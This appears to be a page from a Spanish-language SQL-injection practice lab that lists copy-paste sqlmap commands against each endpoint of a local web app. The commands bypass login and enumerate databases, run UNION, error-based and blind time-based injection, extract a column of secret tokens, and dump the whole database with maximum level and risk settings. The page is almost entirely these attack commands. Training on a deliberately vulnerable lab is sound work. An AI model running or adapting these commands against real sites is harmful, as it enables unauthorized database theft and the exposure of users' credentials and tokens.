🤖 Comandos sqlmap

Copia estos comandos en tu terminal de Linux para atacar cada vulnerabilidad automáticamente.

En Windows ejecuta ipconfig para ver tu IP. Deja localhost si atacas desde la misma máquina.

Authentication Bypass · POST /login

🔑 Login — Enumerar base de datos

Terminal Linux 
sqlmap -u "http://192.168.1.17:3000/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --dbms=mysql \
  --level=3 \
  --risk=2 \
  --dbs \
  --batch \
  --banner
UNION-based · GET /noticias

📰 Noticias — Volcar tabla usuarios

Terminal Linux 
sqlmap -u "http://192.168.1.17:3000/noticias?id=1" \
  --dbms=mysql \
  --technique=U \
  --level=3 \
  -D practica \
  -T usuarios \
  --dump \
  --batch
Error-based · GET /productos

🛍️ Productos — Extraer datos via errores MySQL

Terminal Linux 
sqlmap -u "http://192.168.1.17:3000/productos?categoria=electronica" \
  --dbms=mysql \
  --technique=E \
  --level=3 \
  --risk=3 \
  -D practica \
  -T perfiles \
  --dump \
  --batch
Blind Boolean + Time-based · GET /buscar

🔍 Buscar — Blind SQLi (sin output directo)

Terminal Linux 
sqlmap -u "http://192.168.1.17:3000/buscar?q=laptop" \
  --dbms=mysql \
  --technique=BT \
  --level=5 \
  --risk=3 \
  --time-sec=3 \
  -D practica \
  -T usuarios \
  --dump \
  --batch
Data Exposure · GET /perfil

👤 Perfil — Extraer tokens secretos

Terminal Linux 
sqlmap -u "http://192.168.1.17:3000/perfil?user=admin" \
  --dbms=mysql \
  -D practica \
  -T perfiles \
  -C "nombre_completo,token_secreto" \
  --dump \
  --batch
Ataque completo

💣 Dump completo de toda la base de datos

Terminal Linux 
sqlmap -u "http://192.168.1.17:3000/noticias?id=1" \
  --dbms=mysql \
  --technique=BEUST \
  --level=5 \
  --risk=3 \
  --dump-all \
  --exclude-sysdbs \
  --batch \
  --flush-session
